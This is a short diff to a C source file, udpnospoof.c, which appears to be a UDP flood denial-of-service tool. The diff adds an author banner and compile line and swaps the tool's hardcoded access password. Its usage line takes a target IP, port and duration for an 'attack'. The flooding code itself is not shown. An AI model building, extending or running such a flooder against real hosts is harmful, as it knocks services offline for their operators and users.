@@ -1,3 +1,12 @@
+/*
+=============================================================================
+            gcc -oterm -pthread -w udpnospoof.c -o udpnospoof
+                        ----- CODED SponneR ------
+=============================================================================
+*/
+
+
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -65,7 +74,7 @@ main(int argc, char **argv)
         printf("\x1b[90mUsage: %s attack [IP] [Port] [Time]\n", argv[0]);
         exit(1);
     }
-    if(!strcmp(argv[1], "cat-stresser.net"))
+    if(!strcmp(argv[1], "1337Systemx86"))
     {
         if(argc < 4)
         {
